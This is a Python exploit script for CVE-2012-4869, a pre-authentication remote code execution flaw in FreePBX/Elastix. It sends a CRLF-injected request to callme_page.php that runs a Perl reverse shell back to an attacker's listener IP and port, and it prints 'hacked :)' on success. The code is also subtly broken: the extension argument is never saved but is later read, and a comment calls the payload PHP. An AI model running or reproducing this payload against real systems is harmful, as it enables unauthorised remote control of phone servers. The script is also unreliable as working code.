import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2012-4869
# FreePBX/Elastix pre-auth RCE
class CVE2012_4869:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, rhost, ext, lhost, lport):
        print (LogColors.BLUE + "victim: " + rhost  + "..." + LogColors.ENDC)
        self.url = "https://{}".format(rhost).rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def get_payload(self):
        print (LogColors.BLUE + "get payload..." + LogColors.ENDC)
        payload = "action=c&callmenum={}@from-internal/".format(self.ext)
        payload += "n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e"
        payload += "%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET"
        payload += "%28PeerAddr%2c%22{}%3a{}%22%29%3bSTDIN-%3e".format(self.lhost, self.lport)
        payload += "fdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"
        return payload

    # send payload. update file with rev shell php code
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        try:
            r = self.session.get(self.url + "/recordings/misc/callme_page.php?" + self.get_payload(), verify = False)
        except Exception:
            print (LogColors.RED + "failed to send payload :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)

    # exploitation logic
    def exploit(self):
        self.send_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-r','--rhost', required = True, help = "target host")
    parser.add_argument('-e','--ext', required = True, help = "Elastix caller ext")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    rhost, ext = args['rhost'], args['ext']
    ip, port = args['ip'], args['port']
    cve = CVE2012_4869(rhost, ext, ip, port)
    cve.exploit()

